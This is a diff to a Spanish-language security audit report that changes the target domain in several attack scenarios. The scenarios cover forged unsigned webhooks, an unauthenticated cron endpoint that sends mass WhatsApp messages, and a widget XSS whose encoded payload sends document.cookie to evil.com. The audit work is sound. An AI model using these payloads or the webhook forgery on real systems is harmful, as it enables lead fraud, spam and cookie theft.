@@ -1,4 +1,4 @@
----
+﻿---
 title: "Deep Findings Summary — Informe Consolidado"
 date: 2026-05-19
 agent: Consolidator Deep
@@ -239,7 +239,7 @@ DA-5 encontró 10+ instancias de `alert()` para reportar errores y `window.confi
 
 **Flujo:**
 1. Atacante obtiene `tenant_id` y `lead_id` válidos (disponibles via múltiples vectores, incluyendo el endpoint abierto de orchestration).
-2. POST a `https://app.automatizaformacion.com/api/webhooks/retell` con payload simulando llamada exitosa: `{ call: { metadata: { tenant_id: "uuid", lead_id: "uuid" } }, transcript: "Usuario: Tengo grado universitario y 5 años de experiencia..." }`.
+2. POST a `https://app.linkstation.ai/api/webhooks/retell` con payload simulando llamada exitosa: `{ call: { metadata: { tenant_id: "uuid", lead_id: "uuid" } }, transcript: "Usuario: Tengo grado universitario y 5 años de experiencia..." }`.
 3. Sin validación de firma (DA-4-001), el webhook acepta el payload.
 4. `PostAnalysisService.processInteraction()` analiza la transcripción fabricada con OpenAI y determina `qualified = "si"`.
 5. El lead pasa a `CUALIFICADO` en la BD y el CRM de Zoho se actualiza.
@@ -250,7 +250,7 @@ DA-5 encontró 10+ instancias de `alert()` para reportar errores y `window.confi
 **Escenario:** Actor externo quiere forzar el envío masivo de mensajes WhatsApp o ejecutar el sweep del orquestador repetidamente.
 
 **Flujo:**
-1. GET a `https://app.automatizaformacion.com/api/cron/appointments/reminders` — sin ninguna autenticación (DA-3-001).
+1. GET a `https://app.linkstation.ai/api/cron/appointments/reminders` — sin ninguna autenticación (DA-3-001).
 2. El endpoint envía recordatorios WhatsApp a TODOS los leads con citas de TODOS los tenants.
 3. La respuesta incluye nombres de leads (PII) y estados de envío.
 4. Repetir cada pocos minutos → spam masivo a todos los clientes de todos los tenants.
@@ -262,7 +262,7 @@ DA-5 encontró 10+ instancias de `alert()` para reportar errores y `window.confi
 **Escenario:** Un atacante quiere ejecutar JavaScript en el sitio web de los clientes de Esden que han embebido el widget de chat.
 
 **Flujo:**
-1. Un cliente de Esden embebe el widget con `<script src="https://app.automatizaformacion.com/api/widget/embed.js?id=<uuid>">`.
+1. Un cliente de Esden embebe el widget con `<script src="https://app.linkstation.ai/api/widget/embed.js?id=<uuid>">`.
 2. Atacante convence al cliente de usar una URL con `id` malicioso, o explota un XSS previo para cambiar el src.
 3. URL: `.../api/widget/embed.js?id="%3B%20fetch('https://evil.com?c='+document.cookie)%3B%20var%20x%3D"`
 4. El script resultante roba cookies de todos los visitantes del sitio del cliente.
